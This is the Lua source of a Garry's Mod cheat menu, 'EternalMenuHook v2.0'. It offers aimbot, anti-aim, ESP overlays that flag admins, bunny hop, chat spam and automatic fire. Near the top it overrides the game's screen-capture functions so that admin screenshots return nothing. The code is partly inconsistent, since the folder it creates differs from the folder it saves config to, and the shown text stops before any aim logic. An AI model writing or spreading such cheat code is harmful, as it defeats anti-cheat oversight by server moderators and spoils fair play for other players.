local me = LocalPlayer()
local steam = me:SteamID64()

local version = "2.0"

local PrimaryCol, FriendCol, NpcCol, AdminCol = Color(153, 0, 255), Color(0,201,201), Color(200,200,200), Color(255,0,0)

render.Capture = function( ... )
    return "no."
end
 
render.CapturePixels = function( ... )
        return "no."
end

----------- Fonts.

surface.CreateFont("Verdana", { font = "Verdana", size = 12, antialias = false, outline  = true })
surface.CreateFont("Verdana_Menu", { font = "Verdana", size = 12, antialias = false, outline  = true })
surface.CreateFont("Watermark", { font = "Segoe UI", size = 20, antialias = false, outline = true })

do

	if not file.IsDir("EternalMenuHack", "DATA") then
		file.CreateDir("EternalMenuHack")
	end

	if not _G.Loaded then
		if SERVER then return end

		if not system.IsWindows() then
			return
		end


		chat.AddText(PrimaryCol, "Press \"Insert\", \"Home\" or \"F11\" to open the menu.") chat.PlaySound()

		_G.Loaded = true
	end
end

------------------------------------------------------------------- Actual localization

local wep = me:GetActiveWeapon()

local realname = me:Nick()
local oldAngles = Angle()

local fa, aa, notyetselected, aimtarget, aimignore, spamming, pitch, yaw

local spam_messages = { "u kenno", " noob" }

local changetime = 0
local faketick = 1
local ox = 3856
local oy = -3856

local name_changed, skipped, applied = false
local ignore_dev = false

local insertdown2, insertdown, menuopen

local mousedown, candoslider, drawlast
local visible = {}

local FindMetaTable = FindMetaTable
local cm = FindMetaTable"CUserCmd"
local wm = FindMetaTable"Weapon"
local am = FindMetaTable"Angle"
local vm = FindMetaTable"Vector"
local cn = FindMetaTable"ConVar"
local im =  FindMetaTable"IMaterial"

local cones = {}
local nullvec = Vector() * -1
local IsFirstTimePredicted = IsFirstTimePredicted
local CurTime = CurTime
local namechangeTime, servertime, w8 = 0
local options, order

unloaded = false

me:ConCommand("cl_interp 0; gmod_mcore_test 1; r_queued_ropes 1; cl_threaded_bone_setup 1; cl_threaded_client_leaf_system 1; mat_queue_mode -1; r_threaded_renderables 1; r_threaded_particles 1; M9KGasEffect 0; hud_draw_fixed_reticle 0")

-- GAME EVENTS --

gameevent.Listen("entity_killed")
gameevent.Listen("player_say")
--gameevent.Listen("player_connect")
gameevent.Listen("player_disconnect")
gameevent.Listen("player_hurt")


-- FEATURES --

options = {
	["Aimbot"] = {
		{
			{"Aimbot", 85, 40, 350, 155, 175},
			{"Enabled", "Checkbox", false, 0},
			{"Silent Aimbot", "Checkbox", false, 0},
			{"Auto Fire", "Checkbox", false, 0},
			{"Melee Aimbot", "Checkbox", false, 0},
			{"Aim Key", "Selection", "None", {"None", "Mouse3", "Mouse4", "L-ALT", "Letter: E", "Letter: F"}, 125},
		},
		{
			{"Other", 445, 40, 350, 170, 175},
			{"Priority", "Selection", "Nearest", {"Nearest", "Lowest Health", "Highest Health"}, 125 },
			{"Aim Position", "Selection", "Head only", {"Head only", "Body only"}, 125 },
			{"Ignore Team", "Checkbox", false, 0},
			{"Ignore Friends", "Checkbox", false, 0},
			{"Ignore Bots", "Checkbox", false, 0},
			{"Ignore Admins", "Checkbox", false, 0},
		},
	},
	["Hack vs Hack"] = {
		{
			{"Anti-Aim", 85, 40, 350, 160, 175},
			{"Enabled", "Checkbox", false, 0},
			{"Follow closest Target", "Checkbox", false, 0},
			{"Rotation", "Selection", "Left", {"Left", "Right"}, 125},
			{"Pitch", "Selection", "None", {"None", "Up", "Down", "Center", "Jitter"}, 125},
			{"Yaw", "Selection", "None", {"None", "Sideways", "Jitter", "Fake-Backwards"}, 125},
		},
		{
			{"Anti-Aim Resolver", 445, 40, 350, 60, 175},
			{"Enabled", "Checkbox", false, 0},
		},
	},
	["Visuals"] = {
		{
			{"ESP", 85, 40, 350, 330, 175},
			{"Enabled", "Checkbox", false, 0},
			{"Players", "Checkbox", false, 0},
			{"NPCs", "Checkbox", false, 0},
			{"Box", "Checkbox", false, 0},
			{"Name", "Checkbox", false, 0},
			{"Health Value", "Checkbox", false, 0},
			{"Health Bar", "Checkbox", false, 0},
			{"Rank", "Checkbox", false, 0},
			{"Weapon", "Checkbox", false, 0},
			{"Bones", "Checkbox", false, 0},
			{"Friends", "Checkbox", false, 0},
			{"Admins", "Checkbox", false, 0},
		},
		{
			{"Other", 445, 40, 350, 330, 175},
			{"Enemies only", "Checkbox", false, 0},
			{"Glow", "Checkbox", false, 0},
			{"No Recoil", "Checkbox", false, 0},
			{"No Hands", "Checkbox", false, 0},
			{"No Viewmodel", "Checkbox", false, 0},
			{"Custom FOV", "Checkbox", false, 0},
			{"FOV", "Slider", 120, 175, 125},
			{"Thirdperson", "Checkbox", false, 0},
			{"Thirdperson Distance", "Slider", 20, 100, 125},
		},
	},
	["Misc"] = {
		{
			{"Misc", 85, 40, 350, 250, 175},
			{"Bunny Hop", "Checkbox", false, 0},
			{"Auto Respawn", "Checkbox", false, 0},
			{"Spam \"Use\"", "Checkbox", false, 0},
			{"Log Kills in Chat", "Checkbox", false, 0},
			{"Chat Spam", "Checkbox", false, 0},
			{"Hitsound", "Checkbox", false, 0},
			{"Mute Footsteps", "Checkbox", false, 0},
			{"Clean Screenshots", "Checkbox", false, 0},
		},
	},
	["Settings"] = {
		{
			{"Primary Color", 50, 20, 250, 105, 130},
			{"Red", "Slider", 15, 255, 88},
			{"Green", "Slider", 150, 255, 88},
			{"Blue", "Slider", 255, 255, 88},
		},
		{
			{"Friend Color", 50, 145, 250, 105, 130},
			{"Red", "Slider", 0, 255, 88},
			{"Green", "Slider", 201, 255, 88},
			{"Blue", "Slider", 201, 255, 88},
		},
		{
			{"NPC Color", 50, 270, 250, 105, 130},
			{"Red", "Slider", 200, 255, 88},
			{"Green", "Slider", 200, 255, 88},
			{"Blue", "Slider", 200, 255, 88},
		},
		{
			{"Admin Color", 50, 390, 250, 105, 130},
			{"Red", "Slider", 255, 255, 88},
			{"Green", "Slider", 15, 255, 88},
			{"Blue", "Slider", 255, 255, 88},
		},
		{
			{"ESP Distance", 310, 20, 250, 105, 130},
			{"Enabled", "Checkbox", false, 0},
			{"Max Distance", "Slider", 1000, 3000, 88},
		},
		{
			{"Outlines", 310, 145, 250, 50, 130},
			{"Opacity", "Slider", 50, 255, 88},
		},
	},
}

order = { "Aimbot", "Hack vs Hack", "Visuals", "Misc", "Settings" }

local function updatevar( men, sub, lookup, new )
	for aa,aaa in next, options[men] do
		for key, val in next, aaa do
			if(aaa[1][1] != sub) then
				continue
			end
			if(val[1] == lookup) then
				val[3] = new
			end
		end
	end
end

local function saveconfig1()
	file.Write("EternalMenuHook/eblan_config.txt", util.TableToJSON(options))
end

local function loadconfig1()
	if file.Exists("EternalMenuHook/eblan_config.txt", "DATA") then
		local tab = util.JSONToTable( file.Read("EternalMenuHook/eblan_config.txt", "DATA") )
		local cursub
		for k,v in next, tab do
			if not options[k] then continue end
			for men, subtab in next, v do
				for key, val in next, subtab do
					if key == 1 then
						cursub = val[1]
						continue
					end
					updatevar(k, cursub, val[1], val[3])
				end
			end
		end
	end
end

local function gBool(men, sub, lookup)
	if not options[men] then return end
	for aa,aaa in next, options[men] do
		for key, val in next, aaa do
			if(aaa[1][1] ~= sub) then
				continue
			end
			if(val[1] == lookup) then
				return val[3]
			end
		end
	end
end

local function gOption(men, sub, lookup)
	if not options[men] then return "" end
	for aa,aaa in next, options[men] do
		for key, val in next, aaa do
			if aaa[1][1] ~= sub then
				continue
			end
			if val[1] == lookup then
				return val[3]
			end
		end
	end
	return ""
end

local function gInt(men, sub, lookup)
	if not options[men] then return 0 end
	for aa,aaa in next, options[men] do
		for key, val in next, aaa do
			if aaa[1][1] ~= sub then
				continue
			end
			if val[1] == lookup then
				return val[3]
			end
		end
	end
	return 0
end

local function MouseInArea(minx, miny, maxx, maxy)
	local mousex, mousey = gui.MousePos()
	return(mousex < maxx and mousex > minx and mousey < maxy and mousey > miny)
end

local function DrawOptions(self, w, h)
	local mx, my = self:GetPos()
	local sizeper = (w - 10) / #order
	local maxx = 0

	for k,v in next, order do
		local bMouse = MouseInArea(mx + 5 + maxx, my + 31, mx + 5 + maxx + sizeper, my + 31 + 30)
		if visible[v] then
			local curcol = Color(PrimaryCol.r / 2, PrimaryCol.g / 2, PrimaryCol.b / 2, 100)
			for i = 0, 30 do
				surface.SetDrawColor(curcol)
				curcol.r, curcol.g, curcol.b = curcol.r + 0, curcol.g + 0, curcol.b + 0
				surface.DrawLine( 5 + maxx, 31 + i, 5 + maxx + sizeper, 31 + i)
			end
		elseif(bMouse) then
			local curcol = Color(255, 255, 255, 10)
			for i = 0, 30 do
				surface.SetDrawColor(curcol)
				curcol.r, curcol.g, curcol.b = curcol.r - 1.7, curcol.g - 1.7, curcol.b - 1.7
				surface.DrawLine( 5 + maxx, 31 + i, 5 + maxx + sizeper, 31 + i)
			end
		else
			local curcol = Color(0, 0, 0, 0)
			for i = 0, 30 do
				surface.SetDrawColor(curcol)
				curcol.r, curcol.g, curcol.b = curcol.r - 1.7, curcol.g - 1.7, curcol.b - 1.7
				surface.DrawLine( 5 + maxx, 31 + i, 5 + maxx + sizeper, 31 + i)
			end
		end
		if(bMouse and input.IsMouseDown(MOUSE_LEFT) and !mousedown and !visible[v]) then
			local nb = visible[v]
			for key,val in next, visible do
				visible[key] = false
			end
			visible[v] = !nb
		end

		surface.SetFont("Verdana_Menu")
		surface.SetTextColor(PrimaryCol.r, PrimaryCol.g, PrimaryCol.b, 175)
		local tw, th = surface.GetTextSize(v)
		surface.SetTextPos( 5 + maxx + sizeper / 2 - tw / 2, 31 + 15 - th / 2 )
		surface.DrawText(v)
		maxx = maxx + sizeper
	end
end

local function DrawCheckbox(self, w, h, var, maxy, posx, posy, dist)
	surface.SetFont("Verdana_Menu")
	surface.SetTextColor(PrimaryCol.r, PrimaryCol.g, PrimaryCol.b, 200)
	surface.SetTextPos( 5 + posx + 15 + 5, 61 + posy + maxy )
	local tw, th = surface.GetTextSize(var[1])
	surface.DrawText(var[1])
	surface.SetDrawColor(PrimaryCol.r, PrimaryCol.g, PrimaryCol.b, 200)
	surface.DrawOutlinedRect( 5 + posx + 15 + 5 + dist + var[4], 61 + posy + maxy, 14, 14)
	local mx, my = self:GetPos()
	local bMouse = MouseInArea(mx + 5 + posx + 15 + 5, my + 61 + posy + maxy, mx + 5 + posx + 15 + 5 + dist + 14 + var[4], my + 61 + posy + maxy + 16)

	if bMouse then
		surface.DrawRect( 5 + posx + 15 + 5 + dist + 2 + var[4], 61 + posy + maxy + 2, 10, 10)
	end

	if(var[3]) then
		surface.SetDrawColor(PrimaryCol.r-30,PrimaryCol.g-30,PrimaryCol.b-30, 100)
		surface.DrawRect( 5 + posx + 15 + 5 + dist + 2 + var[4], 61 + posy + maxy + 2, 10, 10)
		surface.SetDrawColor(PrimaryCol.r-10,PrimaryCol.g-10,PrimaryCol.b-10, 100)
		surface.DrawOutlinedRect( 5 + posx + 15 + 5 + dist + 2 + var[4], 61 + posy + maxy + 2, 10, 10)
	end

	if(bMouse and input.IsMouseDown(MOUSE_LEFT) and !mousedown and !drawlast) then
		var[3] = !var[3]
	end
end

local function DrawSlider(self, w, h, var, maxy, posx, posy, dist)
	local curnum = var[3]
	local max = var[4]
	local size = var[5]
	surface.SetFont("Verdana_Menu")
	surface.SetTextColor(PrimaryCol.r, PrimaryCol.g, PrimaryCol.b, 200)
	surface.SetTextPos( 5 + posx + 15 + 5, 61 + posy + maxy )
	surface.DrawText(var[1])
	local tw, th = surface.GetTextSize(var[1])
	surface.SetDrawColor(50, 50, 50, 255)
	surface.DrawRect( 5 + posx + 15 + 5 + dist, 61 + posy + maxy + 9, size, 2)
	surface.SetDrawColor(PrimaryCol.r, PrimaryCol.g, PrimaryCol.b, 150)
	surface.DrawRect( 5 + posx + 15 + 5 + dist, 61 + posy + maxy + 9, size, 2)
	local ww = math.ceil(curnum * size / max)
	surface.DrawRect( 3 + posx + 15 + 5 + dist + ww, 61 + posy + maxy + 9 - 5, 6, 12)
	surface.SetDrawColor(0,0,0)
	local tw, th = surface.GetTextSize(curnum)
	surface.DrawOutlinedRect( 3 + posx + 15 + 5 + dist + ww, 61 + posy + maxy + 4, 6, 12)
	surface.SetTextPos( 5 + posx + 15 + 5 + dist + (size / 2) - tw / 2, 48.7 + posy + maxy + 16)
	surface.DrawText(curnum)
	local mx, my = self:GetPos()
	local bMouse = MouseInArea(5 + posx + 15 + 5 + dist + mx, 61 + posy + maxy + 9 - 5 + my, 5 + posx + 15 + 5 + dist + mx + size, 61 + posy + maxy + 9 - 5 + my + 12)

	if bMouse and input.IsMouseDown(MOUSE_LEFT) and !drawlast and not candoslider then
		local mw, mh = gui.MousePos()
		local new = math.ceil( ((mw - (mx + posx + 25 + dist - size)) - (size + 1)) / (size - 2) * max)
		var[3] = new
	end
end

local function DrawSelect(self, w, h, var, maxy, posx, posy, dist)
	local size = var[5]
	local curopt = var[3]
	surface.SetFont("Verdana_Menu")
	surface.SetTextColor(PrimaryCol.r, PrimaryCol.g, PrimaryCol.b, 200)
	surface.SetTextPos( 5 + posx + 15 + 5, 61 + posy + maxy )
	local tw, th = surface.GetTextSize(var[1])
	surface.DrawText(var[1])
	surface.SetDrawColor(PrimaryCol.r, PrimaryCol.g, PrimaryCol.b, 50)
	surface.DrawOutlinedRect( 25 + posx + dist, 61 + posy + maxy, size, 16)
	local mx, my = self:GetPos()
	local bMouse = MouseInArea( mx + 25 + posx + dist, my + 61 + posy + maxy, mx + 25 + posx + dist + size, my + 61 + posy + maxy + 16)
	local check = dist..posy..posx..w..h..maxy

	if bMouse or notyetselected == check then
		surface.DrawRect(25 + posx + dist + 2, 61 + posy + maxy + 2, size - 4, 12)
	end

	local tw, th = surface.GetTextSize(curopt)
	surface.SetTextPos( 25 + posx + dist + 5, 61 + posy + maxy + 6 - th / 2 + 2)
	surface.DrawText(curopt)

	if bMouse and input.IsMouseDown(MOUSE_LEFT) and not drawlast and not mousedown or notyetselected == check then
		notyetselected = check
		drawlast = function()
			local maxy2 = 16
			for k,v in next, var[4] do
				surface.SetDrawColor(PrimaryCol.r-75, PrimaryCol.g-75, PrimaryCol.b-75, 125)
				surface.DrawRect( 25 + posx + dist, 61 + posy + maxy + maxy2, size, 16)
				local bMouse2 = MouseInArea( mx + 25 + posx + dist, my + 61 + posy + maxy + maxy2, mx + 25 + posx + dist + size, my + 61 + posy + maxy + 16 + maxy2)
				if bMouse2 then
					surface.SetDrawColor(PrimaryCol.r-50,PrimaryCol.g-50,PrimaryCol.b-50, 100)
					surface.DrawRect( 25 + posx + dist, 61 + posy + maxy + maxy2, size, 16)
				end
				local tw, th = surface.GetTextSize(v)
				surface.SetTextPos( 25 + posx + dist + 5, 61 + posy + maxy + 6 - th / 2 + 2 + maxy2)
				surface.DrawText(v)
				maxy2 = maxy2 + 16
				if bMouse2 and input.IsMouseDown(MOUSE_LEFT) and not mousedown then
					var[3] = v
					notyetselected = nil
					drawlast = nil
					return
				end
			end
			local bbMouse = MouseInArea( mx + 25 + posx + dist, my + 61 + posy + maxy, mx + 25 + posx + dist + size, my + 61 + posy + maxy + maxy2)
			if not bbMouse and input.IsMouseDown(MOUSE_LEFT) and not mousedown then
				notyetselected = nil
				drawlast = nil
				return
			end
		end
	end
end

local function DrawSubSub(self, w, h, k, var)
	local opt, posx, posy, sizex, sizey, dist = var[1][1], var[1][2], var[1][3], var[1][4], var[1][5], var[1][6]
	surface.SetDrawColor(PrimaryCol.r, PrimaryCol.g, PrimaryCol.b, gInt("Settings", "Outlines", "Opacity"))
	local startpos = 61 + posy
	surface.SetTextColor(PrimaryCol.r, PrimaryCol.g, PrimaryCol.b, 200)
	surface.SetFont("Verdana_Menu")
	local tw, th = surface.GetTextSize(opt)
	surface.DrawLine( 5 + posx, startpos, 5 + posx + 15, startpos)
	surface.SetTextPos( 5 + posx + 15 + 5, startpos - th / 2 )
	surface.DrawLine( 5 + posx + 15 + 5 + tw + 5, startpos, 5 + posx + sizex, startpos)
	surface.DrawLine( 5 + posx, startpos, 5 + posx, startpos + sizey)
	surface.DrawLine( 5 + posx, startpos + sizey, 5 + posx + sizex, startpos + sizey)
	surface.DrawLine( 5 + posx + sizex, startpos, 5 + posx + sizex, startpos + sizey)
	surface.DrawText(opt)
	local maxy = 15

	for k,v in next, var do
		if k == 1 then
			continue
		end
		if v[2] == "Checkbox" then
			DrawCheckbox(self, w, h, v, maxy, posx, posy, dist)
		elseif v[2] == "Slider" then
			DrawSlider(self, w, h, v, maxy, posx, posy, dist)
		elseif v[2] == "Selection" then
			DrawSelect(self, w, h, v, maxy, posx, posy, dist)
		end
		maxy = maxy + 25
	end
end

local function DrawSub(self, w, h)
	for k, v in next, visible do
		if not v then
			continue
		end
		for _, var in next, options[k] do
			DrawSubSub(self, w, h, k, var)
		end
	end
end

local function DrawUnloadButton(self, w, h)
	local curcol = Color(80, 80, 80, 75)
	local mx, my = self:GetPos()
	local bMouse = MouseInArea(mx + 825, my + h - 700, mx + 900, my + h - 700 + 30)
	if(bMouse) then
		curcol = Color(PrimaryCol.r + 60,PrimaryCol.g + 60,PrimaryCol.b + 60, 65)
	end
	for i = 0, 30 do
		surface.SetDrawColor(curcol)
		surface.DrawLine( 825, h - 700 + i, 900, h - 700 + i )
		for k,v in next, curcol do
			curcol[k] = curcol[k] - 2
		end
	end
	surface.SetFont("Verdana_Menu")
	surface.SetTextColor(PrimaryCol.r, PrimaryCol.g, PrimaryCol.b)
	local tw, th = surface.GetTextSize("Unload")
	surface.SetTextPos( 865 - tw / 2, h - 685 - th / 2 )
	surface.DrawText("Unload")

	if bMouse and input.IsMouseDown(MOUSE_LEFT) then
		unloaded = true

		hook.Remove("CreateMove", "Hook")
		hook.Remove("HUDPaint", "Hook")
		hook.Remove("PlayerFootstep", "Hook")
		hook.Remove("CalcView", "Hook")
		hook.Remove("ShouldDrawLocalPlayer", "Hook")
		hook.Remove("player_hurt", "Hook")
		hook.Remove("PreDrawPlayerHands", "Hook")
		hook.Remove("PreDrawViewModel", "Hook")
		hook.Remove("entity_killed", "Hook")
		hook.Remove("player_disconnect", "Hook")
		hook.Remove("player_say", "Hook")
		hook.Remove("Move", "Hook")
		hook.Remove("PreDrawOpaqueRenderables", "Hook")
		hook.Remove("PlayerFootstep", "Hook")
		hook.Remove("OnPlayerChat", "Hook")
		hook.Remove("Think", "Hook")

		_G.Loaded = false

		saveconfig1()
	end
end




for k,v in next, order do
	visible[v] = false
end
---------

-------

local function menu()
	local frame = vgui.Create("DFrame")
	frame:SetSize(900, 700)
	frame:Center()
	frame:SetTitle("")
	frame:MakePopup()
	frame:SetDraggable(true)
	frame:ShowCloseButton(false)

	frame.Paint = function(self, w, h)
		if(candoslider and !mousedown and !drawlast and !input.IsMouseDown(MOUSE_LEFT)) then
			candoslider = false
		end
	    draw.RoundedBox(5, 0, 0, 5000, 5000, Color(GetConVarNumber("menu_r"), GetConVarNumber("menu_g"), GetConVarNumber("menu_b"), 170))
        surface.SetDrawColor( 255, 255, 255, 255 )
        surface.DrawTexturedRect( 10, 7.5, 25, 25 )
		surface.DrawOutlinedRect(0, 0, frame:GetSize())
		draw.SimpleText("            EternalMenuHook v2.0", "Verdana_Menu", 10, 10, PrimaryCol, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP )

		DrawOptions(self, w, h)
		DrawSub(self, w, h)
		DrawUnloadButton(self, w, h)
		if drawlast then
			drawlast()
			candoslider = true
		end
		mousedown = input.IsMouseDown(MOUSE_LEFT)
	end

	frame.Think = function()
		if (input.IsKeyDown(KEY_INSERT) or input.IsKeyDown(KEY_F11) or input.IsKeyDown(KEY_HOME)) and not insertdown2 or unloaded == true then
			frame:Remove()
			menuopen = false
			candoslider = true
			drawlast = nil
		end
	end
end

local function nophys()
	if gBool("Hack vs Hack", "Anti-Aim", "Enabled") or not me:Alive() or me:Health() < 1 then
		return false
	end

	if me:GetActiveWeapon():IsValid() and me:GetActiveWeapon():GetClass() == "weapon_physgun" then
		return true
	else
		return false
	end
end

local function colors()
	PrimaryCol = Color(gInt("Settings", "Primary Color", "Red"), gInt("Settings", "Primary Color", "Green"), gInt("Settings", "Primary Color", "Blue"))
	FriendCol = Color(gInt("Settings", "Friend Color", "Red"), gInt("Settings", "Friend Color", "Green"), gInt("Settings", "Friend Color", "Blue"))
	NpcCol = Color(gInt("Settings", "NPC Color", "Red"), gInt("Settings", "NPC Color", "Green"), gInt("Settings", "NPC Color", "Blue"))
	AdminCol = Color(gInt("Settings", "Admin Color", "Red"), gInt("Settings", "Admin Color", "Green"), gInt("Settings", "Admin Color", "Blue"))
end

local function configs()
	if not menuopen and not saved then
		saveconfig1()
		saved = true
	elseif menuopen and saved then
		saved = false
	end
end

local function aimkeycheck()
	if gBool("Aimbot", "Aimbot", "Enabled") then
		if gBool("Aimbot", "Aimbot", "Aim Key") == "Mouse3" then
			if input.IsMouseDown(109) then return true end
		end
		if gBool("Aimbot", "Aimbot", "Aim Key") == "Mouse4" then
			if input.IsMouseDown(110) then return true end
		end
		if gBool("Aimbot", "Aimbot", "Aim Key") == "L-ALT" then
			if input.IsKeyDown(81) then return true end
		end
		if gBool("Aimbot", "Aimbot", "Aim Key") == "Letter: E" then
			if input.IsKeyDown(15) then return true end
		end
		if gBool("Aimbot", "Aimbot", "Aim Key") == "Letter: F" then
			if input.IsKeyDown(16) then return true end
		end
		if gBool("Aimbot", "Aimbot", "Aim Key") == "None" then
			return true
		end
	end
end

--

hook.Add("Move", "Hook", function()
	--if not IsFirstTimePredicted() then return end

	servertime = CurTime()
end)

local function WeaponCanFire()
	local w = me:GetActiveWeapon(me)
	if not w or not w:IsValid() then
		return true
	end
	return servertime >= w:GetNextPrimaryFire()
end

--

local function WeaponShootable()
	if me:Alive() and me:GetActiveWeapon():IsValid(wep) then
		if wep:Clip1() <= 0 then
			return
		end
		if string.find(string.lower(wep:GetPrintName()),"knife") or string.find(string.lower(wep:GetPrintName()),"grenade") or string.find(string.lower(wep:GetPrintName()),"sword") or string.find(string.lower(wep:GetPrintName()),"bomb") or string.find(string.lower(wep:GetPrintName()),"ied") or string.find(string.lower(wep:GetPrintName()),"c4") or string.find(string.lower(wep:GetPrintName()),"slam") or string.find(string.lower(wep:GetPrintName()),"climb") or string.find(string.lower(wep:GetPrintName()),"fist") or string.find(string.lower(wep:GetPrintName()),"crossbow") or string.find(string.lower(wep:GetPrintName()),"gravitygun") then
			return false
		end
		return true
	end
end

local function bunnyhop(cmd)
	buttons = cmd:GetButtons()
	if cmd:KeyDown(IN_JUMP) and IsValid(me) and me:GetMoveType() ~= MOVETYPE_NOCLIP and me:Alive() then
		if not me:IsOnGround() then
			buttons = bit.band(buttons, bit.bnot(IN_JUMP))
		end
		cmd:SetButtons(buttons)
	end
end

local function maxdist(v)
	if gBool("Settings", "ESP Distance", "Enabled") then
		if v:GetPos():Distance(me:GetPos()) > gInt("Settings", "ESP Distance", "Max Distance")*5 and v:IsPlayer() and v:GetFriendStatus() ~= "friend" then
			return false
		end
	end

	if v:GetPos():Distance(me:GetPos()) < 30 then
		return false
	else
		return true
	end
end

local function esp_col(v)
	if v:IsPlayer() then
		if gBool("Visuals", "ESP", "Friends") and v:GetFriendStatus() == "friend" then
			return FriendCol
		elseif gBool("Visuals", "ESP", "Admins") and v:IsAdmin() then
			if engine.ActiveGamemode() == "murder" and v:HasWeapon("weapon_mu_magnum") then
				return Color(50,150,255)
			else
				return AdminCol
			end
		else
			return PrimaryCol
		end
	elseif v:IsNPC() then
		return NpcCol
	else
		return PrimaryCol
	end
end

local function filter(v)
	if gBool("Visuals", "ESP", "Players") and not gBool("Visuals", "ESP", "NPCs") then
		return v:IsPlayer()
	elseif gBool("Visuals", "ESP", "NPCs") and not gBool("Visuals", "ESP", "Players") then
		return v:IsNPC()
	elseif gBool("Visuals", "ESP", "Players") and gBool("Visuals", "ESP", "NPCs") then
		return v:IsPlayer() or v:IsNPC()
	else
		return nil
	end
end

local function esp()
	for k,v in pairs(ents.GetAll()) do

		if not v:IsValid() or not maxdist(v) or v:Health() < 1 or v:IsDormant() or v == me or not filter(v) then continue end

		texty1 = 5

		x1, y1, x2, y2 = ScrW() * 2, ScrH() * 2, -ScrW(), -ScrH()
		min, max = v:GetCollisionBounds()
		corners = { v:LocalToWorld(Vector(min.x, min.y, min.z)):ToScreen(), v:LocalToWorld(Vector(min.x, max.y, min.z)):ToScreen(), v:LocalToWorld(Vector(max.x, max.y, min.z)):ToScreen(), v:LocalToWorld(Vector(max.x, min.y, min.z)):ToScreen(), v:LocalToWorld(Vector(min.x, min.y, max.z)):ToScreen(), v:LocalToWorld(Vector(min.x, max.y, max.z)):ToScreen(), v:LocalToWorld(Vector(max.x, max.y, max.z)):ToScreen(), v:LocalToWorld(Vector(max.x, min.y, max.z)):ToScreen() }
	
		for _k, _v in next, corners do
			x1, y1 = math.min(x1, _v.x), math.min(y1, _v.y)
			x2, y2 = math.max(x2, _v.x), math.max(y2, _v.y)
		end
		
		diff, diff2 = math.abs(x2 - x1), math.abs(y2 - y1)

		if gBool("Visuals", "ESP", "Box") then
			surface.SetDrawColor(0,0,0)
			surface.DrawOutlinedRect(x1 - 1, y1 - 1, diff + 2, diff2 + 2)
			surface.DrawOutlinedRect(x1 + 1, y1 + 1, diff - 2, diff2 - 2)
			surface.SetDrawColor(esp_col(v))
			surface.DrawOutlinedRect(x1, y1, diff, diff2)
		end

		if gBool("Visuals", "ESP", "Bones") then
			for i = 0, v:GetBoneCount() do
				local parent = v:GetBoneParent(i)
				if not v:GetBoneParent(i) then continue end
				local bonepos = v:GetBonePosition(i)
				if v:GetBonePosition(i) == v:GetPos() then continue end
				local parentpos = v:GetBonePosition(v:GetBoneParent(i))
				if not v:GetBonePosition(i) or not v:GetBonePosition(v:GetBoneParent(i)) then continue end
				local screen1, screen2 = bonepos:ToScreen(), parentpos:ToScreen()

				surface.SetDrawColor(255,255,255)
				surface.DrawLine(screen1.x, screen1.y, screen2.x, screen2.y)
			end
		end

		if gBool("Visuals", "ESP", "Health Bar") and v:Health() > 0 then
			surface.SetDrawColor(0,0,0)
			surface.DrawRect(x1 - 6, y1, 3, diff2)
			surface.DrawRect(x1 - 7, y1 - 1, 5, diff2 + 2)

			surface.SetDrawColor(Color(255 - 255 / v:GetMaxHealth() * v:Health(), 255 / v:GetMaxHealth() * v:Health(), 0))
			surface.DrawRect(x1 - 6, y2 - math.Clamp(diff2 / v:GetMaxHealth() * v:Health(), 0, diff2), 3, math.Clamp(diff2 / v:GetMaxHealth() * v:Health(), 0, diff2))
		end

		if gBool("Visuals", "ESP", "Name") then
			if v:IsPlayer() then
				if gBool("Visuals", "ESP", "Admins") and v:IsAdmin() and not v:GetFriendStatus() == "friend" then
					draw.SimpleText(v:Nick(), "Verdana", x2 + 2, y1 + texty1, AdminCol, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, 1)
				else
					draw.SimpleText(v:Nick(), "Verdana", x2 + 2, y1 + texty1, esp_col(v), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, 1)
				end
			else
				draw.SimpleText(v:GetClass(), "Verdana", x2 + 2, y1 + texty1, esp_col(v), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, 1)
			end
			texty1 = texty1 + 12
		end

		if gBool("Visuals", "ESP", "Health Value") and v:Health() > 0 then
			draw.SimpleText(v:Health().." HP", "Verdana", x2 + 2, y1 + texty1, Color(255 - 255 / v:GetMaxHealth() * v:Health(), 255 / v:GetMaxHealth() * v:Health(), 0), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, 1)
			texty1 = texty1 + 12
		end

		if gBool("Visuals", "ESP", "Rank") and v:IsPlayer() then
			if v:IsAdmin() then
				draw.SimpleText(string.lower(v:GetNWString("usergroup")), "Verdana", x2 + 2, y1 + texty1, AdminCol, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, 1)
			else
				draw.SimpleText(string.lower(v:GetNWString("usergroup")), "Verdana", x2 + 2, y1 + texty1, Color(255,255,255), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, 1)
			end
			texty1 = texty1 + 12
		end

		if gBool("Visuals", "ESP", "Weapon") then
			if v:GetActiveWeapon():IsValid() then
				draw.SimpleText(string.lower(v:GetActiveWeapon():GetPrintName()), "Verdana", x2 + 2, y1 + texty1, esp_col(v), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, 1)
				texty1 = texty1 + 12
			end
		end

		if gBool("Visuals", "Other", "Glow") then
			halo.Add({v}, esp_col(v), 0.8, 0.8, 1, true, true)
		end
	end
end

local function normalizeAngle(ang)
	ang.p = math.NormalizeAngle(ang.p)
	ang.p = math.Clamp(ang.p, -89, 89)
	ang.y = math.NormalizeAngle(ang.y)
end

local function FixMovement(cmd)
	local vec = Vector(cmd:GetForwardMove(), cmd:GetSideMove(), 0)
	local vel = math.sqrt(vec.x*vec.x + vec.y*vec.y)
	local mang = vec:Angle()
	local yaw = cmd:GetViewAngles().y - fa.y + mang.y

	if ((cmd:GetViewAngles().p+90)%360) > 180 then
		yaw = 180 - yaw
	end

	yaw = ((yaw + 180)%360)-180
	cmd:SetForwardMove(math.cos(math.rad(yaw)) * vel)
	cmd:SetSideMove(math.sin(math.rad(yaw)) * vel)
end

local function Clamp(val, min, max)
	if(val < min) then
		return min
	elseif(val > max) then
		return max
	end
	return val
end

local function NormalizeAngle(ang)
	if not nophys() then
		ang.x = math.NormalizeAngle(ang.x)
		ang.p = math.Clamp(ang.p, -89, 89)
	end
end

function Copy(tt, lt)
	local copy = {}
	if lt then
	if type(tt) == "table" then
	for k,v in next, tt do
		copy[k] = Copy(k, v)
	end
	else
		copy = lt
	end
		return copy
	end
	if type(tt) != "table" then
		copy = tt
	else
		for k,v in next, tt do
			copy[k] = Copy(k, v)
		end
	end
	return copy
end

local table = Copy(table)
